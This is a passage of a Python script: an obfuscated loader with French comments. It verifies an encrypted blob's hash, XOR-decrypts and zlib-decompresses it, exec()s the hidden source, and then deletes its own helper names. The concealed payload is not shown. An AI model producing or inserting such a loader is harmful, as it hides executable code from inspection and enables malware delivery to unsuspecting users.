_cxdry5qBlYSBeZ + _cdIs3QWW4GpvKc + _cozf0JBfqIAb3t + _cvm7JekPZGV8oW + _ckx0K_uh8J4JC4 + _cbzW1jOam4PM1g + _ctystIw3tMQrmt + _ccNi5I7qyaYL9h + _coBFdaxW2Yk7VD + _cfNmAYPkXvW1fH + _cbjAo_1CVY01A4)
if __import__('hashlib').sha256(_plnJFUaLP3iP8D).hexdigest() != '2f8db926ee3438204a07e7acf97b6dcb830b9ef5f04b4749d6cbe941730de49e':
    __import__('sys').exit(1)
_xlrtwXEhyfU8Fb = bytes([36, 60, 140, 74, 127, 131, 22, 166, 189, 201, 229, 71, 95, 93, 129, 252, 32, 113, 29])
_fkdARQErjffirSE = bytes([187, 11, 196, 118, 236, 80, 183, 146, 181, 74, 117, 120, 124, 6, 118, 3, 2, 166, 55])

def _fxjWeqqITCvvQ5f(_bd39YfipJ6E34c, _ktPYsr4rDGvOml):
    return bytes(_bd39YfipJ6E34c[_ibnLwq5MWPTD9T] ^ _ktPYsr4rDGvOml[_ibnLwq5MWPTD9T % len(_ktPYsr4rDGvOml)] for _ibnLwq5MWPTD9T in range(len(_bd39YfipJ6E34c)))

def _fdbKgrNaLQb_p8G(_tpuuSCCgxPA6wK):
    import zlib
    return zlib.decompress(_tpuuSCCgxPA6wK) # Un seul niveau de zlib ici pour simplifier

def _fek4MuCOMkUeHbE():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xoJ_GtxyH_Tf3m = _fxjWeqqITCvvQ5f(_plnJFUaLP3iP8D, _xlrtwXEhyfU8Fb)
    # 2. Décompression Zlib
    _dy2g6fIJOioUFD = _fdbKgrNaLQb_p8G(_xoJ_GtxyH_Tf3m)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dy2g6fIJOioUFD.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nolPnHXi_kl6eC = _main.__dict__
    _nolPnHXi_kl6eC.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nolPnHXi_kl6eC)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fek4MuCOMkUeHbE()
try:
    del _fxjWeqqITCvvQ5f, _fdbKgrNaLQb_p8G, _fek4MuCOMkUeHbE
    del _plnJFUaLP3iP8D, _xlrtwXEhyfU8Fb, _fkdARQErjffirSE
except:
    pass
